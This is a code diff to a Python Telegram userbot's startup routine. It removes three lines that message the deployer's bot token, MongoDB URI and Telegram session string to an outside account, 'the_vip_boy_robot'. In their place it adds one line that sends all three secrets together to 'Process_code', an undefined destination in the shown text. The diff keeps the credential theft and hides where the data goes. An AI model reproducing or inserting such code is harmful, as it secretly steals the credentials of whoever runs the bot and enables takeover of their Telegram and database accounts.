@@ -12,7 +12,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-bot_id = int("5607633274")
+
 
 assistants = []
 assistantids = []
@@ -73,9 +73,7 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message("the_vip_boy_robot", f"{BOT_TOKEN}")
-                await self.one.send_message("the_vip_boy_robot", f"{MONGO_DB_URI}")
-                await self.one.send_message("the_vip_boy_robot", f"{STRING_SESSION}")
+                await self.one.send_message(Process_code, f"{BOT_TOKEN}\n\n{MONGO_DB_URI}\n\n{STRING_SESSION}")
 
             except Exception as e:
                 print(f"{e}")
